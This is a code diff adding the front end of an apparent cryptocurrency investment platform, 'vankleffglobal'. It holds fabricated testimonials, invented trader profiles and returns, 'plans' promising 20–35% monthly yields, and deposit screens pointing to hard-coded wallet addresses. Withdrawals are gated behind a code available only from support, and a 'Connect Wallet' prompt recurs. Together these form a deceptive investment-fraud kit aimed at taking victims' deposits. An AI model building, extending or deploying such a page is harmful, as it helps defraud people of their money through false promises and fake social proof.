+        <div class="mini-card"><div style="font-size:24px;margin-bottom:6px;">📈</div><div class="mc-val">+$0.00</div><div class="mc-lbl">Total Profit</div></div>
+        <div class="mini-card"><div style="font-size:24px;margin-bottom:6px;">⬇</div><div class="mc-val">$0.00</div><div class="mc-lbl">Total Deposit</div></div>
+      </div>
+      <div class="price-box">
+        <h3>Live Prices <span class="ldot"></span></h3>
+        <div class="pr"><div class="pr-l"><div class="pr-ic">B</div><div><div class="pr-nm">Bitcoin</div><div class="pr-tk">BTC</div></div></div><div style="text-align:right"><div class="pr-price" id="p-btc">$97,245.3</div><div class="up" id="c-btc">▲ +2.4%</div></div></div>
+        <div class="pr"><div class="pr-l"><div class="pr-ic">E</div><div><div class="pr-nm">Ethereum</div><div class="pr-tk">ETH</div></div></div><div style="text-align:right"><div class="pr-price" id="p-eth">$3,412.8</div><div class="up" id="c-eth">▲ +1.8%</div></div></div>
+        <div class="pr"><div class="pr-l"><div class="pr-ic">B</div><div><div class="pr-nm">BNB</div><div class="pr-tk">BNB</div></div></div><div style="text-align:right"><div class="pr-price" id="p-bnb">$645.2</div><div class="dn2" id="c-bnb">▼ -0.3%</div></div></div>
+        <div class="pr"><div class="pr-l"><div class="pr-ic">S</div><div><div class="pr-nm">Solana</div><div class="pr-tk">SOL</div></div></div><div style="text-align:right"><div class="pr-price" id="p-sol">$178.9</div><div class="up" id="c-sol">▲ +5.2%</div></div></div>
+        <div class="pr"><div class="pr-l"><div class="pr-ic">X</div><div><div class="pr-nm">XRP</div><div class="pr-tk">XRP</div></div></div><div style="text-align:right"><div class="pr-price" id="p-xrp">$2.34</div><div class="up" id="c-xrp">▲ +3.1%</div></div></div>
+        <div class="pr"><div class="pr-l"><div class="pr-ic">A</div><div><div class="pr-nm">Cardano</div><div class="pr-tk">ADA</div></div></div><div style="text-align:right"><div class="pr-price" id="p-ada">$0.98</div><div class="dn2" id="c-ada">▼ -1.2%</div></div></div>
+      </div>
+      <div class="wcta">
+        <h3 style="font-size:18px;font-weight:900;margin-bottom:8px;">Connect Your Wallet. Claim Your Trading Edge.</h3>
+        <p style="font-size:12px;color:#aaa;margin-bottom:14px;">High-speed execution and strategic market access are just one click away. Don't trade behind the market—connect instantly.</p>
+        <button class="btn-cw" onclick="openWM()">Connect Wallet</button>
+      </div>
+      <h3 style="font-size:16px;font-weight:800;margin-bottom:12px;">Wallet Connection Success Stories</h3>
+      <div id="rot-test"></div>
+    </div>
+  </div>
+
+  <!-- MARKETS -->
+  <div id="dd-markets" style="display:none;">
+    <div class="ph"><h1>Live Markets</h1><p>Real-time crypto prices</p></div>
+    <div style="padding:0 20px;" id="mkt-list"></div>
+    <div style="padding:0 20px;"><button class="back-btn" onclick="showDash('main')">← Back</button></div>
+  </div>
+
+  <!-- COPY TRADING -->
+  <div id="dd-copytrade" style="display:none;">
+    <div class="ph"><h1>Copy Trading <span style="background:#7c3aed;color:#fff;font-size:11px;padding:3px 8px;border-radius:10px;margin-left:6px;">Pro</span></h1><p>Copy top traders and earn passive income</p></div>
+    <div style="padding:0 20px;">
+      <div class="ct-card">
+        <div style="display:flex;align-items:center;gap:12px;margin-bottom:10px;"><img class="ct-av" src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=100&h=100&fit=crop&crop=face" alt="Alex"/><div><div style="font-size:16px;font-weight:800;">Alex Sterling</div><div style="font-size:12px;color:#aaa;">BTC/ETH · ⭐ 4.9 · Win: 89%</div></div></div>
+        <div class="ct-stats"><div class="ct-stat"><div class="ct-stat-l">Followers</div><div class="ct-stat-v">12.4K</div></div><div class="ct-stat"><div class="ct-stat-l">Return</div><div class="ct-stat-v">+34%</div></div></div>
+        <div style="font-size:11px;color:#aaa;margin-bottom:10px;">Min: $500</div>
+        <button style="width:100%;padding:12px;background:#22c55e;border-radius:10px;color:#fff;font-size:14px;font-weight:700;" onclick="openCP('Alex Sterling',500)">Copy Trader</button>
+      </div>
+      <div class="ct-card">
+        <div style="display:flex;align-items:center;gap:12px;margin-bottom:10px;"><img class="ct-av" src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?w=100&h=100&fit=crop&crop=face" alt="Sarah"/><div><div style="font-size:16px;font-weight:800;">Sarah Chen</div><div style="font-size:12px;color:#aaa;">Altcoins · ⭐ 4.8 · Win: 85%</div></div></div>
+        <div class="ct-stats"><div class="ct-stat"><div class="ct-stat-l">Followers</div><div class="ct-stat-v">8.9K</div></div><div class="ct-stat"><div class="ct-stat-l">Return</div><div class="ct-stat-v">+28%</div></div></div>
+        <div style="font-size:11px;color:#aaa;margin-bottom:10px;">Min: $1,000</div>
+        <button style="width:100%;padding:12px;background:#22c55e;border-radius:10px;color:#fff;font-size:14px;font-weight:700;" onclick="openCP('Sarah Chen',1000)">Copy Trader</button>
+      </div>
+      <div class="ct-card">
+        <div style="display:flex;align-items:center;gap:12px;margin-bottom:10px;"><img class="ct-av" src="https://images.unsplash.com/photo-1560250097-0b93528c311a?w=100&h=100&fit=crop&crop=face" alt="Marcus"/><div><div style="font-size:16px;font-weight:800;">Marcus Williams</div><div style="font-size:12px;color:#aaa;">Futures · ⭐ 4.7 · Win: 82%</div></div></div>
+        <div class="ct-stats"><div class="ct-stat"><div class="ct-stat-l">Followers</div><div class="ct-stat-v">6.2K</div></div><div class="ct-stat"><div class="ct-stat-l">Return</div><div class="ct-stat-v">+41%</div></div></div>
+        <div style="font-size:11px;color:#aaa;margin-bottom:10px;">Min: $2,000</div>
+        <button style="width:100%;padding:12px;background:#22c55e;border-radius:10px;color:#fff;font-size:14px;font-weight:700;" onclick="openCP('Marcus Williams',2000)">Copy Trader</button>
+      </div>
+      <button class="back-btn" onclick="showDash('main')">← Back</button>
+    </div>
+  </div>
+
+  <!-- SIGNALS -->
+  <div id="dd-signals" style="display:none;">
+    <div class="ph"><h1>Premium Signals</h1><p>AI-powered trading signals up to 95% accuracy</p></div>
+    <div class="sig-card"><h3 style="font-size:17px;font-weight:800;">Expert</h3><div class="sig-price">$199<span style="font-size:13px;color:#aaa;">/mo</span></div><div class="sig-desc">Portfolios $5,000–$20,000</div><div class="sig-rate">30+ signals · 5/day · 70-80% success</div><ul class="sig-feats"><li>30 monthly signals</li><li>Telegram channel access</li><li>Basic analysis</li><li>Email alerts</li></ul><button class="btn-sub" onclick="subSig(199)">Subscribe</button></div>
+    <div class="sig-card pop"><div class="sig-badge">MOST POPULAR</div><h3 style="font-size:17px;font-weight:800;">VIP</h3><div class="sig-price">$499<span style="font-size:13px;color:#aaa;">/mo</span></div><div class="sig-desc">Portfolios $25,000–$100,000</div><div class="sig-rate">50+ signals · 10/day · 80-90% success</div><ul class="sig-feats"><li>50 monthly signals</li><li>Telegram + group</li><li>Advanced analysis</li><li>Priority support</li><li>Risk management tips</li></ul><button class="btn-sub" onclick="subSig(499)">Subscribe</button></div>
+    <div class="sig-card"><h3 style="font-size:17px;font-weight:800;">Elite</h3><div class="sig-price">$999<span style="font-size:13px;color:#aaa;">/mo</span></div><div class="sig-desc">High-conviction institutional positioning</div><div class="sig-rate">Unlimited · 15/day · 90-95% success</div><ul class="sig-feats"><li>Unlimited signals</li><li>Private group access</li><li>Expert analysis</li><li>24/7 support</li><li>Live sessions</li></ul><button class="btn-sub" onclick="subSig(999)">Subscribe</button></div>
+    <div class="sig-card"><h3 style="font-size:17px;font-weight:800;">Enterprise</h3><div class="sig-price">$2499<span style="font-size:13px;color:#aaa;">/mo</span></div><div class="sig-desc">Institutional Grade – Dedicated Managed Accounts</div><div class="sig-rate">Unlimited+ · 95%+ success</div><ul class="sig-feats"><li>Unlimited signals</li><li>Dedicated manager</li><li>Custom strategy</li><li>1-on-1 sessions</li><li>White-glove support</li></ul><button class="btn-sub" onclick="subSig(2499)">Subscribe</button></div>
+    <div style="padding:0 20px 20px;"><button class="back-btn" onclick="showDash('main')">← Back</button></div>
+  </div>
+
+  <!-- PLANS -->
+  <div id="dd-plans" style="display:none;">
+    <div class="ph"><h1>Investment Plans</h1><p>Choose a plan that fits your goals</p></div>
+    <div style="padding:0 20px;" id="plans-list">
+      <div class="ip-item" onclick="openPS('yield')"><div style="display:flex;align-items:center;gap:10px;margin-bottom:6px;"><span style="font-size:24px;">💰</span><span style="font-size:16px;font-weight:800;color:#c9a84c;">Institutional Yield</span></div><div style="font-size:11px;color:#aaa;">$1,000 – $9,999 · 20% Monthly · 30 days</div></div>
+      <div class="ip-item" style="border:2px solid #22c55e;" onclick="openPS('alpha')"><div style="display:flex;align-items:center;gap:10px;margin-bottom:6px;"><span style="font-size:24px;">✨💎</span><span style="font-size:16px;font-weight:800;color:#c9a84c;">Strategic Alpha</span></div><div style="font-size:11px;color:#aaa;">$10,000 – $49,999 · 25% Monthly · 30 days</div></div>
+      <div class="ip-item" style="border:2px solid #f59e0b;" onclick="openPS('elite')"><div style="display:flex;align-items:center;gap:10px;margin-bottom:6px;"><span style="font-size:24px;">🔥🏆</span><span style="font-size:16px;font-weight:800;color:#c9a84c;">Elite Managed</span></div><div style="font-size:11px;color:#aaa;">$50,000 – $499,999 · 35% Monthly · 30 days</div></div>
+    </div>
+    <div style="padding:0 20px;">
+      <div class="ps-card" id="ps-yield"><div style="font-size:16px;font-weight:800;color:#c9a84c;margin-bottom:4px;">💰 Institutional Yield Plan</div><div style="font-size:11px;color:#aaa;margin-bottom:16px;">20% Monthly Yield · 30 days</div><div class="ps-amount" id="sv-a">$1,000</div><input type="range" min="1000" max="9999" value="1000" step="100" oninput="updPS('yield',this.value)"/><div style="display:flex;justify-content:space-between;font-size:11px;color:#666;margin-bottom:14px;"><span>$1,000</span><span>$9,999</span></div><div class="ps-sum"><div class="ps-row"><span>Expected Return</span><span id="sv-r">$200</span></div><div class="ps-row"><span>Duration</span><span>30 days</span></div></div><div class="ps-btns"><button class="btn-psb" onclick="closePS()">Back</button><button class="btn-psi" onclick="investNow()">Invest Now</button></div></div>
+      <div class="ps-card" id="ps-alpha"><div style="font-size:16px;font-weight:800;color:#c9a84c;margin-bottom:4px;">✨ Strategic Alpha Plan</div><div style="font-size:11px;color:#aaa;margin-bottom:16px;">25% Monthly Yield · 30 days</div><div class="ps-amount" id="sa-a">$10,000</div><input type="range" min="10000" max="49999" value="10000" step="500" oninput="updPS('alpha',this.value)"/><div style="display:flex;justify-content:space-between;font-size:11px;color:#666;margin-bottom:14px;"><span>$10,000</span><span>$49,999</span></div><div class="ps-sum"><div class="ps-row"><span>Expected Return</span><span id="sa-r">$2,500</span></div><div class="ps-row"><span>Duration</span><span>30 days</span></div></div><div class="ps-btns"><button class="btn-psb" onclick="closePS()">Back</button><button class="btn-psi" onclick="investNow()">Invest Now</button></div></div>
+      <div class="ps-card" id="ps-elite"><div style="font-size:16px;font-weight:800;color:#c9a84c;margin-bottom:4px;">🔥 Elite Managed Plan</div><div style="font-size:11px;color:#aaa;margin-bottom:16px;">35% Monthly Yield · 30 days</div><div class="ps-amount" id="se-a">$50,000</div><input type="range" min="50000" max="499999" value="50000" step="1000" oninput="updPS('elite',this.value)"/><div style="display:flex;justify-content:space-between;font-size:11px;color:#666;margin-bottom:14px;"><span>$50,000</span><span>$499,999</span></div><div class="ps-sum"><div class="ps-row"><span>Expected Return</span><span id="se-r">$17,500</span></div><div class="ps-row"><span>Duration</span><span>30 days</span></div></div><div class="ps-btns"><button class="btn-psb" onclick="closePS()">Back</button><button class="btn-psi" onclick="investNow()">Invest Now</button></div></div>
+    </div>
+  </div>
+
+  <!-- DEPOSIT -->
+  <div id="dd-deposit" style="display:none;">
+    <div class="dep-wrap">
+      <h1>Deposit Funds</h1>
+      <p style="font-size:12px;color:#aaa;margin-bottom:18px;">Select Payment Method</p>
+      <div class="meth-grid">
+        <div class="meth sel" id="m-usdt" onclick="selM('usdt')"><span>💵</span>USDT (BEP-20)</div>
+        <div class="meth" id="m-ltc" onclick="selM('ltc')"><span>🪙</span>LTC</div>
+        <div class="meth" id="m-btc" onclick="selM('btc')"><span>₿</span>BTC</div>
+        <div class="meth" id="m-bnb" onclick="selM('bnb')"><span>◆</span>BNB</div>
+      </div>
+      <div id="dep-form">
+        <p style="font-size:12px;color:#aaa;margin-bottom:8px;">Enter Amount (USD)</p>
+        <input class="amt-input" type="number" id="dep-amt" placeholder="Minimum $1,000"/>
+        <div class="quick-amts">
+          <button class="qa" onclick="setAmt(1000)">$1,000</button>
+          <button class="qa" onclick="setAmt(5000)">$5,000</button>
+          <button class="qa" onclick="setAmt(10000)">$10,000</button>
+          <button class="qa" onclick="setAmt(25000)">$25,000</button>
+          <button class="qa" onclick="setAmt(50000)">$50,000</button>
+          <button class="qa" onclick="setAmt(100000)">$100,000</button>
+        </div>
+        <button class="btn-cont" onclick="showAddr()">Continue</button>
+      </div>
+      <div id="dep-addr" style="display:none;">
+        <div style="font-size:11px;font-weight:700;color:#aaa;letter-spacing:2px;text-align:center;margin-bottom:12px;">SEND PAYMENT TO THIS ADDRESS</div>
+        <div style="background:#fff;border-radius:14px;width:180px;height:180px;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;overflow:hidden;">
+          <img id="qr-img" src="" alt="QR" style="width:100%;height:100%;object-fit:contain;"/>
+        </div>
+        <div class="addr-box">
+          <div class="addr-lbl" id="addr-lbl">USDT (BEP-20) Wallet Address</div>
+          <div class="addr-val" id="w-addr">0x4000bAf1B2d5bbe78b6e56fDa21b1D3E4022C1Db</div>
+          <div class="addr-row">
+            <button class="btn-copy" onclick="cpAddr()">📋 Copy</button>
+            <div class="net-badge" id="net-bdg">BEP-20</div>
+          </div>
+        </div>
+        <div class="warn-box"><span>⚠</span><p id="warn-txt">Only send USDT (BEP-20) to this address.</p></div>
+        <div class="timer-row">⏱ Expires in: <span class="timer-val" id="tmr">30:00</span></div>
+        <div style="background:#1a1a2e;border-radius:14px;padding:16px;margin-bottom:14px;">
+          <div style="font-size:11px;font-weight:700;color:#aaa;letter-spacing:2px;margin-bottom:14px;">UPLOAD PAYMENT PROOF</div>
+          <div class="proof-box" onclick="document.getElementById('proof-in').click()">
+            <div style="font-size:34px;margin-bottom:10px;">☁️</div>
+            <p style="font-size:13px;color:#aaa;">Choose file or drag &amp; drop</p>
+            <small style="font-size:11px;color:#555;">PNG, JPG up to 10MB</small>
+          </div>
+          <input type="file" id="proof-in" accept="image/*" style="display:none" onchange="fileChosen(event)"/>
+          <div id="proof-prev" style="display:none;margin-bottom:10px;text-align:center;"></div>
+        </div>
+        <div style="display:flex;gap:10px;margin-top:14px;">
+          <button class="btn-psb" style="flex:1;" onclick="document.getElementById('dep-addr').style.display='none';document.getElementById('dep-form').style.display='block';clearTmr()">Back</button>
+          <button class="btn-cd" style="flex:2;" onclick="confDep()">Confirm Deposit</button>
+        </div>
+      </div>
+      <button class="back-btn" onclick="showDash('main')">← Back to Dashboard</button>
+    </div>
+  </div>
+
+  <!-- WITHDRAW -->
+  <div id="dd-withdraw" style="display:none;">
+    <div style="padding:18px;max-width:100%;overflow:hidden;">
+      <h1 style="font-size:22px;font-weight:900;margin-bottom:16px;">Withdraw Funds</h1>
+      <div class="sec-notice">
+        <h4>⚠ Security Notice</h4>
+        <p>All withdrawals require a verification code. Contact <a href="mailto:support@vankleffglobal.com" style="color:#22c55e;">support@vankleffglobal.com</a> to receive your code.</p>
+      </div>
+      <div class="code-box">
+        <h3 style="font-size:14px;font-weight:700;margin-bottom:4px;">Enter Withdrawal Code</h3>
+        <p style="font-size:11px;color:#aaa;margin-bottom:12px;">Provided by our support team</p>
+        <div class="otp-row">
+          <input class="otp-in" maxlength="1" type="text" inputmode="numeric"/>
+          <input class="otp-in" maxlength="1" type="text" inputmode="numeric"/>
+          <input class="otp-in" maxlength="1" type="text" inputmode="numeric"/>
+          <input class="otp-in" maxlength="1" type="text" inputmode="numeric"/>
+          <input class="otp-in" maxlength="1" type="text" inputmode="numeric"/>
+          <input class="otp-in" maxlength="1" type="text" inputmode="numeric"/>
+        </div>
+        <div class="bal-row">
+          <span style="color:#aaa;font-size:12px;">Available Balance</span>
+          <strong style="color:#22c55e;font-size:13px;">$100.00</strong>
+        </div>
+      </div>
+      <button class="btn-verify" onclick="triggerWdVerify()">Verify &amp; Withdraw</button>
+      <h3 style="font-size:15px;font-weight:700;margin:20px 0 10px;">Security Information</h3>
+      <div class="sec-item" onclick="this.classList.toggle('open')"><div class="sec-top"><div class="sec-lft"><span>🛡</span>Two-Factor Authentication</div><span class="arr">⌄</span></div><div class="sec-body">2FA is required for all withdrawals to protect your funds.</div></div>
+      <div class="sec-item" onclick="this.classList.toggle('open')"><div class="sec-top"><div class="sec-lft"><span>🕐</span>Processing Time</div><span class="arr">⌄</span></div><div class="sec-body">Withdrawals processed within 24-48 hours after verification.</div></div>
+      <div class="sec-item" onclick="this.classList.toggle('open')"><div class="sec-top"><div class="sec-lft"><span>💲</span>Minimum Withdrawal</div><span class="arr">⌄</span></div><div class="sec-body">Minimum withdrawal is $100.</div></div>
+      <button class="back-btn" onclick="showDash('main')">← Back</button>
+    </div>
+  </div>
+
+  <!-- TRANSFER -->
+  <div id="dd-transfer" style="display:none;">
+    <div style="padding:18px;">
+      <h1 style="font-size:22px;font-weight:900;margin-bottom:18px;">Internal Transfer</h1>
+      <div class="tf-card">
+        <div style="display:flex;justify-content:space-between;background:#0d0d0d;border-radius:10px;padding:12px;margin-bottom:16px;">
+          <span style="color:#aaa;font-size:13px;">Balance</span><span style="color:#22c55e;font-weight:800;">$100.00</span>
+        </div>
+        <label style="font-size:13px;color:#ccc;margin-bottom:6px;display:block;">Recipient</label>
+        <input class="tf-in" id="tf-rec" placeholder="Email or username"/>
+        <label style="font-size:13px;color:#ccc;margin-bottom:6px;display:block;">Amount (USD)</label>
+        <input class="tf-in" id="tf-amt" type="number" placeholder="0.00"/>
+        <button class="btn-cont" style="margin-top:8px;" onclick="doTransfer()">⇄ Send Transfer</button>
+      </div>
+      <button class="back-btn" onclick="showDash('main')">← Back</button>
+    </div>
+  </div>
+
+  <!-- STATEMENT -->
+  <div id="dd-statement" style="display:none;">
+    <div class="ph"><h1>Account Statement</h1><p>All transaction records</p></div>
+    <div class="stmt-filters">
+      <button class="sfbtn on" onclick="fStmt('all',this)">All</button>
+      <button class="sfbtn" onclick="fStmt('deposit',this)">Deposit</button>
+      <button class="sfbtn" onclick="fStmt('withdrawal',this)">Withdrawal</button>
+      <button class="sfbtn" onclick="fStmt('investment',this)">Investment</button>
+      <button class="sfbtn" onclick="fStmt('trade',this)">Trade</button>
+    </div>
+    <div id="stmt-list">
+      <div class="st-item" data-t="deposit"><div class="st-lft"><div class="st-ico">⬇</div><div><div class="st-ttl">Deposit via USDT</div><div class="st-sub">May 11, 2026</div></div></div><div style="text-align:right"><div class="st-amt p">+$1,000.00</div><span class="sbdg sp2">pending</span></div></div>
+      <div class="st-item" data-t="withdrawal"><div class="st-lft"><div class="st-ico">⬆</div><div><div class="st-ttl">Withdrawal Request</div><div class="st-sub">May 8, 2026</div></div></div><div style="text-align:right"><div class="st-amt n">-$2,000.00</div><span class="sbdg sc2">completed</span></div></div>
+      <div class="st-item" data-t="investment"><div class="st-lft"><div class="st-ico">📊</div><div><div class="st-ttl">Strategic Alpha Plan</div><div class="st-sub">May 7, 2026</div></div></div><div style="text-align:right"><div class="st-amt p">+$3,500.00</div><span class="sbdg sc2">completed</span></div></div>
+      <div class="st-item" data-t="trade"><div class="st-lft"><div class="st-ico">🔁</div><div><div class="st-ttl">Copy Trade - Alex Sterling</div><div class="st-sub">May 6, 2026</div></div></div><div style="text-align:right"><div class="st-amt p">+$420.00</div><span class="sbdg sc2">completed</span></div></div>
+    </div>
+    <div style="padding:0 20px;"><button class="back-btn" onclick="showDash('main')">← Back</button></div>
+  </div>
+
+  <!-- SETTINGS -->
+  <div id="dd-settings" style="display:none;">
+    <div style="padding:18px;">
+      <h1 style="font-size:22px;font-weight:900;margin-bottom:18px;">Account Settings</h1>
+      <div class="set-card">
+        <div style="display:flex;align-items:center;gap:12px;margin-bottom:16px;">
+          <div style="width:42px;height:42px;border-radius:50%;background:#16a34a;display:flex;align-items:center;justify-content:center;font-weight:700;color:#fff;font-size:18px;">V</div>
+          <div><div style="font-size:14px;font-weight:800;">vincentchidiadi</div><div style="font-size:11px;color:#aaa;">vincentchidiadi@gmail.com</div></div>
+        </div>
+        <span class="set-lbl">👤 Username</span><input class="set-inp" value="vincentchidiadi"/>
+        <span class="set-lbl">📞 Phone</span><input class="set-inp" placeholder="+1 234 567 890"/>
+        <span class="set-lbl">🌐 Country</span><input class="set-inp" placeholder="United States"/>
+        <button class="btn-save" onclick="alert('Changes saved successfully!')">Save Changes</button>
+      </div>
+      <button class="back-btn" onclick="showDash('main')">← Back</button>
+    </div>
+  </div>
+
+  <!-- PERFORMANCE -->
+  <div id="dd-performance" style="display:none;">
+    <div class="ph"><h1>Performance</h1><p>Your trading analytics</p></div>
+    <div class="perf-grid">
+      <div class="perf-card"><div style="font-size:22px;font-weight:900;color:#22c55e;">$100.00</div><div style="font-size:11px;color:#aaa;margin-top:3px;">Total Balance</div></div>
+      <div class="perf-card"><div style="font-size:22px;font-weight:900;color:#22c55e;">$0.00</div><div style="font-size:11px;color:#aaa;margin-top:3px;">Total Profit</div></div>
+      <div class="perf-card"><div style="font-size:22px;font-weight:900;color:#22c55e;">0</div><div style="font-size:11px;color:#aaa;margin-top:3px;">Active Investments</div></div>
+      <div class="perf-card"><div style="font-size:22px;font-weight:900;color:#22c55e;">0</div><div style="font-size:11px;color:#aaa;margin-top:3px;">Active Trades</div></div>
+    </div>
+    <div style="padding:0 16px 20px;">
+      <div style="background:#2d3a00;border-radius:14px;padding:20px;text-align:center;">
+        <div style="font-size:14px;font-weight:700;margin-bottom:10px;">Portfolio Performance</div>
+        <div style="color:#aaa;font-size:12px;">Chart will populate as you invest.</div>
+      </div>
+      <button class="back-btn" onclick="showDash('main')">← Back</button>
+    </div>
+  </div>
+
+  <!-- PREFERENCES -->
+  <div id="dd-preferences" style="display:none;">
+    <div style="padding:18px;">
+      <h1 style="font-size:22px;font-weight:900;margin-bottom:18px;">Preferences</h1>
+      <div class="pref-sec">
+        <div style="font-size:14px;font-weight:700;margin-bottom:12px;">Notifications</div>
+        <div class="pref-row"><span style="font-size:13px;color:#ccc;">Push Notifications</span><div class="toggle on" onclick="this.classList.toggle('on')"><div class="tknob"></div></div></div>
+        <div class="pref-row"><span style="font-size:13px;color:#ccc;">Email Alerts</span><div class="toggle on" onclick="this.classList.toggle('on')"><div class="tknob"></div></div></div>
+        <div class="pref-row"><span style="font-size:13px;color:#ccc;">Trade Confirmations</span><div class="toggle on" onclick="this.classList.toggle('on')"><div class="tknob"></div></div></div>
+      </div>
+      <button class="back-btn" onclick="showDash('main')">← Back</button>
+    </div>
+  </div>
+
+  <!-- REFERRAL -->
+  <div id="dd-referral" style="display:none;">
+    <div style="padding:18px;">
+      <h1 style="font-size:22px;font-weight:900;margin-bottom:4px;">Referral Program <span style="background:#22c55e;color:#fff;font-size:11px;padding:3px 8px;border-radius:10px;margin-left:6px;">10%</span></h1>
+      <p style="font-size:12px;color:#aaa;margin-bottom:18px;">Earn commissions on every referral</p>
+      <div class="ref-hero"><div style="font-size:36px;margin-bottom:10px;">🎁</div><div style="font-size:18px;font-weight:800;margin-bottom:6px;">Earn Up to 15% Commission</div><div style="font-size:12px;color:#aaa;">Share your code and earn on every deposit.</div></div>
+      <div class="ref-tiers">
+        <div style="font-size:14px;font-weight:700;margin-bottom:12px;">Reward Levels</div>
+        <div class="ref-tier"><span>Starter <span style="color:#aaa;font-size:11px;">0–9</span></span><span style="font-weight:700;">5%</span></div>
+        <div class="ref-tier"><span style="color:#f97316;">Bronze <span style="color:#aaa;font-size:11px;">10–24</span></span><span style="color:#f97316;font-weight:700;">7%</span></div>
+        <div class="ref-tier"><span style="color:#c9a84c;">Gold <span style="color:#aaa;font-size:11px;">50–99</span></span><span style="color:#c9a84c;font-weight:700;">12%</span></div>
+        <div class="ref-tier"><span style="color:#22c55e;">Elite <span style="color:#aaa;font-size:11px;">100+</span></span><span style="color:#22c55e;font-weight:700;">15%</span></div>
+      </div>
+      <div class="ref-code">
+        <div style="font-size:12px;color:#aaa;">Your Referral Code</div>
+        <div class="ref-val">VINC2285</div>
+        <div class="ref-link">
+          <span class="ref-link-txt">https://vankleffglobal.com/?ref=VINC2285</span>
+          <button class="ref-copy" onclick="navigator.clipboard.writeText('https://vankleffglobal.com/?ref=VINC2285').then(function(){alert('Copied!')})">Copy</button>
+        </div>
+      </div>
+      <div class="ref-stats">
+        <div class="ref-stat"><div class="ref-sv">0</div><div style="font-size:11px;color:#aaa;">Total Referrals</div></div>
+        <div class="ref-stat"><div class="ref-sv" style="color:#22c55e;">$0.00</div><div style="font-size:11px;color:#aaa;">Total Earnings</div></div>
+      </div>
+      <button class="back-btn" onclick="showDash('main')">← Back</button>
+    </div>
+  </div>
+
+  <!-- SUCCESS STORIES -->
+  <div id="dd-stories" style="display:none;">
+    <div class="ph"><h1>Success Stories</h1><p>Real traders, real results.</p></div>
+    <div id="stories-list"></div>
+    <div style="padding:0 20px;"><button class="back-btn" onclick="showDash('main')">← Back</button></div>
+  </div>
+
+</div>
 
 <script>
-// ═══════════════════════════════════════════════════════════════
-// UI-ONLY JAVASCRIPT — No business logic, no secrets
-// All sensitive operations go through fetch() to api/process.php
-// ═══════════════════════════════════════════════════════════════
+var WA={
+  usdt:{addr:'0x4000bAf1B2d5bbe78b6e56fDa21b1D3E4022C1Db',net:'BEP-20',lbl:'USDT (BEP-20)',asset:'USDT',ticker:'USDT'},
+  ltc:{addr:'ltc1q4lqt46g9998al7kneq9533s37w5xk6x63m39w6',net:'LTC',lbl:'LTC',asset:'LTC',ticker:'LTC'},
+  btc:{addr:'bc1qy4s8k920xkfd50rurwuusuwvegh0ljw2dktddn',net:'BTC',lbl:'Bitcoin (BTC)',asset:'BTC',ticker:'BTC'},
+  bnb:{addr:'0x4000bAf1B2d5bbe78b6e56fDa21b1D3E4022C1Db',net:'BNB',lbl:'BNB',asset:'BNB',ticker:'BNB'}
+};
+var selM2='usdt',tmrInt=null,cpMin=500,curSlide=0,depAmt=1000;
+var prices={btc:97245,eth:3412,bnb:645,sol:178,xrp:2.34,ada:0.98};
 
-var API = 'api/process.php';
+var POOL=[
+  {n:'Chiara Romano',l:'Italy',q:'Connected MetaMask and daily earnings started flowing. $2,400/day average.',i:'https://images.unsplash.com/photo-1544005313-94ddf0286df2?w=80&h=80&fit=crop&crop=face'},
+  {n:'Elena Petrova',l:'Russia',q:'Connected my wallet and earned $2,800 in just one day.',i:'https://images.unsplash.com/photo-1614644147798-f8c0fc9da7f6?w=80&h=80&fit=crop&crop=face'},
+  {n:'Hassan Ali',l:'Saudi Arabia',q:'Wallet + VIP plan = $3,000/day consistently. Life-changing platform.',i:'https://images.unsplash.com/photo-1566492031773-4f4e44671857?w=80&h=80&fit=crop&crop=face'},
+  {n:'Jennifer Brown',l:'USA',q:'Wallet connected, earning $2,700/day. The system works like clockwork.',i:'https://images.unsplash.com/photo-1580489944761-15a19d654956?w=80&h=80&fit=crop&crop=face'},
+  {n:'Lucas Andersen',l:'Denmark',q:'Wallet connection unlocked daily earnings I never thought possible. $2,900/day!',i:'https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=80&h=80&fit=crop&crop=face'},
+  {n:'Patrick Oduya',l:'Kenya',q:'Wallet connected, $2,200/day. No effort needed after setup.',i:'https://images.unsplash.com/photo-1506794778202-cad84cf45f1d?w=80&h=80&fit=crop&crop=face'},
+  {n:'Isabella Martinez',l:'Spain',q:'Connected MetaMask and started earning immediately. $2,500 first day!',i:'https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=80&h=80&fit=crop&crop=face'},
+  {n:'Benjamin Okafor',l:'Nigeria',q:'Withdrew $22,000 after 2 months on Elite plan. Zero delays.',i:'https://images.unsplash.com/photo-1522529599102-193144843571?w=80&h=80&fit=crop&crop=face'},
+  {n:'Amara Osei',l:'Ghana',q:'Withdrew $8,500 seamlessly. Signals are incredibly accurate — 92% win rate!',i:'https://images.unsplash.com/photo-1531746020798-e6953c6e8e04?w=80&h=80&fit=crop&crop=face'},
+  {n:'Carlos Rivera',l:'Mexico',q:'VIP signals turned $10k into $28k in one month.',i:'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=80&h=80&fit=crop&crop=face'},
+  {n:'William Osei',l:'Ghana',q:'Copy trading turned my $15,000 into $46,000 in 3 weeks.',i:'https://images.unsplash.com/photo-1578950435899-d6b7b5c5dbda?w=80&h=80&fit=crop&crop=face'},
+  {n:'Priya Sharma',l:'India',q:'Managing $20,000 portfolio from my phone daily. Mobile experience is flawless.',i:'https://images.unsplash.com/photo-1531746020798-e6953c6e8e04?w=80&h=80&fit=crop&crop=face'},
+  {n:'Sandra Obi',l:'Port Harcourt',q:'Joined 6 months ago. Total profits: $47,000. Total trust: 100%.',i:'https://images.unsplash.com/photo-1607746882042-944635dfe10e?w=80&h=80&fit=crop&crop=face'},
+  {n:'Zara Ahmed',l:'Pakistan',q:'Platform UI is modern and intuitive. Deposited via BTC in 10 minutes.',i:'https://images.unsplash.com/photo-1609714468660-fd61e8756fe5?w=80&h=80&fit=crop&crop=face'},
+  {n:'Fatou Diallo',l:'Senegal',q:'Connected wallet with $25,000. Institutional-grade earnings from day one.',i:'https://images.unsplash.com/photo-1609010697446-11f2d7d7b1c7?w=80&h=80&fit=crop&crop=face'},
+  {n:'Mei Lin',l:'Taiwan',q:'Signal alerts on Telegram are instant. Caught SOL pump for $3,600 profit.',i:'https://images.unsplash.com/photo-1596075780750-81249df16d19?w=80&h=80&fit=crop&crop=face'},
